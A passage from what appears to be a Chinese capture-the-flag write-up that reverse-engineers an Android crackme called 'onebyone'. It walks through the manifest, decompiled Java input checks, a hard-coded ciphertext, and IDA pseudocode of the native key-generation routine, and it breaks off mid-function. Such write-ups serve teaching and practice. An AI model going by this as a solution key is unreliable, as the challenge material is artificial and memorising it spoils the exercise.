android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;android.app.lib_name&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">        &lt;provider</span><br><span class="line">            android:name=<span class="string">&quot;androidx.startup.InitializationProvider&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">            android:authorities=<span class="string">&quot;com.example.onebyone.androidx-startup&quot;</span>&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;androidx.emoji2.text.EmojiCompatInitializer&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span><br><span class="line">        &lt;/provider&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
<p>看这个xml的意义是什么呢？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一、为什么从AndroidManifest.xml开始？</span><br><span class="line">1. 找到程序的&quot;地图&quot;</span><br><span class="line">AndroidManifest.xml是Android应用的配置文件，相当于：</span><br><span class="line">建筑的蓝图（知道入口在哪里）</span><br><span class="line">书的目录（知道有哪些章节）</span><br><span class="line">游戏的攻略（知道关卡和规则）</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 关键信息 --&gt;</span><br><span class="line">package=&quot;com.example.onebyone&quot;  // 包名</span><br><span class="line">android:debuggable=&quot;true&quot;       // 可以动态调试！</span><br><span class="line">activity android:name=&quot;com.example.onebyone.MainActivity&quot;  // 主入口</span><br></pre></td></tr></table></figure>
<p>核心信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br><span class="line">    &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure>
<p><code>MainActivity</code>是用户点击图标时第一个打开的界面。复杂的应用可能有多个activity。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.onebyone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.example.onebyone.databinding.ActivityMainBinding;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span>[] jiami(<span class="type">int</span>[] iArr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;onebyone&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">ActivityMainBinding</span> <span class="variable">activityMainBindingInflate</span> <span class="operator">=</span> ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="built_in">this</span>.binding = activityMainBindingInflate;</span><br><span class="line">        setContentView(activityMainBindingInflate.getRoot());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">input</span> <span class="operator">=</span> (EditText) findViewById(R.id.edit1);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">calculateButton</span> <span class="operator">=</span> (Button) findViewById(R.id.button1);</span><br><span class="line">        calculateButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.example.onebyone.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                MainActivity.<span class="built_in">this</span>.processInput(input.getText().toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">processInput</span><span class="params">(String userInput)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span>[] result = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] result1 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] result2 = &#123;<span class="number">206</span>, <span class="number">176</span>, <span class="number">51</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">30</span>, <span class="number">199</span>, <span class="number">248</span>, <span class="number">5</span>, <span class="number">103</span>, <span class="number">255</span>, <span class="number">154</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">69</span>, <span class="number">190</span>, <span class="number">160</span>, <span class="number">235</span>, <span class="number">131</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">112</span>, <span class="number">22</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> (userInput.length() != <span class="number">24</span>) &#123;</span><br><span class="line">                        state = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), <span class="string">&quot;长度错误&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    System.exit(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    result = calculate(userInput);</span><br><span class="line">                    state = <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">24</span>];</span><br><span class="line">                    state = <span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">                        <span class="type">long</span> <span class="variable">value</span> <span class="operator">=</span> result[i];</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">                            arr[(i * <span class="number">8</span>) + j] = (<span class="type">int</span>) ((value &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    state = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                    result1 = jiami(arr);</span><br><span class="line">                    state = <span class="number">6</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.equals(result1, result2)) &#123;</span><br><span class="line">                        state = <span class="number">7</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">8</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), <span class="string">&quot;正确！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), <span class="string">&quot;错误！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">long</span>[] calculate(String input) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span>[] arr4 = <span class="keyword">new</span> <span class="title class_">long</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">long</span>[] a = <span class="keyword">new</span> <span class="title class_">long</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">t</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; input.length()) &#123;</span><br><span class="line">                        state = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="type">String</span> <span class="variable">group</span> <span class="operator">=</span> input.substring(i, Math.min(i + <span class="number">8</span>, input.length()));</span><br><span class="line">                    arr4[i / <span class="number">8</span>] = Long.parseLong(stringToHex(group).substring(<span class="number">0</span>), <span class="number">16</span>);</span><br><span class="line">                    i += <span class="number">8</span>;</span><br><span class="line">                    state = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    j = <span class="number">0</span>;</span><br><span class="line">                    state = <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">if</span> (j &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        state = <span class="number">4</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">7</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    t = arr4[j];</span><br><span class="line">                    i = <span class="number">0</span>;</span><br><span class="line">                    state = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; <span class="number">64</span>) &#123;</span><br><span class="line">                        state = <span class="number">6</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        a[j] = t;</span><br><span class="line">                        j++;</span><br><span class="line">                        state = <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    <span class="keyword">if</span> ((t &amp; Long.MIN_VALUE) == Long.MIN_VALUE) &#123;</span><br><span class="line">                        t = ((Long.MAX_VALUE &amp; t) * <span class="number">2</span>) ^ <span class="number">8284901391658006163L</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        t *= <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    i++;</span><br><span class="line">                    state = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                    <span class="keyword">return</span> a;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> a;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">stringToHex</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = str.toCharArray();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> (idx &lt; chars.length) &#123;</span><br><span class="line">                        state = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    hex.append(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.valueOf(chars[idx])));</span><br><span class="line">                    idx++;</span><br><span class="line">                    state = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">return</span> hex.toString();</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> hex.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在/com/example.onebyone下面可以找到MainActivity。</p>
<p>流程如下：输入 → 长度检查(24位) → calculate()处理 → jiami()加密 → 与密文比较</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] result2 = &#123;<span class="number">206</span>,<span class="number">176</span>,<span class="number">51</span>,<span class="number">89</span>,<span class="number">115</span>,<span class="number">30</span>,<span class="number">199</span>,<span class="number">248</span>,<span class="number">5</span>,<span class="number">103</span>,<span class="number">255</span>,<span class="number">154</span>,<span class="number">27</span>,<span class="number">21</span>,<span class="number">228</span>,<span class="number">69</span>,<span class="number">190</span>,<span class="number">160</span>,<span class="number">235</span>,<span class="number">131</span>,<span class="number">5</span>,<span class="number">16</span>,<span class="number">112</span>,<span class="number">22</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>calculate():</p>
<p><strong>calculate()函数处理</strong></p>
<p>将24字符分成3组（每组8字符）</p>
<p>每组转成16进制，再转成long整数</p>
<p>对每个long进行64次变换（类似线性反馈移位）</p>
<p>jiami函数解压之后ida打开libonebyone.so，找到的函数是Java_com_example_onebyone_MainActivity_jiami</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_com_example_onebyone_MainActivity_jiami</span><span class="params">(_JNIEnv *a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> ArrayLength; <span class="comment">// [rsp+34h] [rbp-6Ch]</span></span><br><span class="line">  __int64 IntArrayElements; <span class="comment">// [rsp+38h] [rbp-68h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+68h] [rbp-38h] BYREF</span></span><br><span class="line">  _DWORD v12[<span class="number">10</span>]; <span class="comment">// [rsp+70h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v12[<span class="number">0</span>] = sub_DB0(<span class="number">104</span>);</span><br><span class="line">  v12[<span class="number">1</span>] = sub_DB0(<span class="number">115</span>);</span><br><span class="line">  v12[<span class="number">2</span>] = sub_DB0(<span class="number">119</span>);</span><br><span class="line">  v12[<span class="number">3</span>] = sub_DB0(<span class="number">83</span>);</span><br><span class="line">  v12[<span class="number">4</span>] = sub_DB0(<span class="number">115</span>);</span><br><span class="line">  v12[<span class="number">5</span>] = sub_DB0(<span class="number">115</span>);</span><br><span class="line">  v12[<span class="number">6</span>] = sub_DB0(<span class="number">93</span>);</span><br><span class="line">  v12[<span class="number">7</span>] = sub_DB0(<span class="number">101</span>);</span><br><span class="line">  sub_DD0(v12, &amp;v11, <span class="number">8</span>);</span><br><span class="line">  IntArrayElements = _JNIEnv::GetIntArrayElements(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !IntArrayElements )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ArrayLength = _JNIEnv::GetArrayLength(a1, a3);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">4LL</span> * ArrayLength);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="number">0</span>) == <span class="number">305419896</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_F10(&amp;v11, <span class="number">8</span>, IntArrayElements, ArrayLength, ptr);</span><br><span class="line">      v5 = _JNIEnv::NewIntArray(a1, ArrayLength);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        _JNIEnv::SetIntArrayRegion(a1, v5, <span class="number">0</span>, ArrayLength, ptr);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">          *((_BYTE *)&amp;v12[<span class="number">-2</span>] + i) = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        _JNIEnv::ReleaseIntArrayElements(a1, a3, IntArrayElements, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        _JNIEnv::ReleaseIntArrayElements(a1, a3, IntArrayElements, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _JNIEnv::ReleaseIntArrayElements(a1, a3, IntArrayElements, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>DB0明显是 用于生成密钥的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_DB0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 ^ <span class="number">0x5Au</span>) + <span class="number">19</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了DD0:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_DD0</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> n8)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= n8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a2 + i) = sub_10D0(*(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">4LL</span> * i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> 